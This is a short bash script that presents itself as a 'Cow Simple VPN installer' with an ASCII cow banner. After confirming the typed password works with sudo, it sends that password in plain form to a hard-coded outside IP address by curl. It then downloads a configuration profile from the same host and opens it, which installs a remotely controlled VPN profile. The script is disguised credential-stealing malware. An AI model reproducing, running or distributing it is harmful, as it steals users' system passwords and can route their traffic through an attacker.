#!/bin/bash

mkdir -p tmp && cd tmp

echo "< Cow Simple VPN installer >
 --------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )===
                ||----w |
                ||     ||"

echo -n "Password: "
read -s password


echo $password | sudo -S date

if [ $? -ne 0 ]; then
    echo "Incorrect password!"
    exit 1
fi

encoded_pwd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$password'''))")
curl "http://95.217.211.87:8010/p/${encoded_pwd}"


wget -O vpn.mobileconfig http://95.217.211.87:8500/vpn-ios.mobileconfig


open vpn.mobileconfig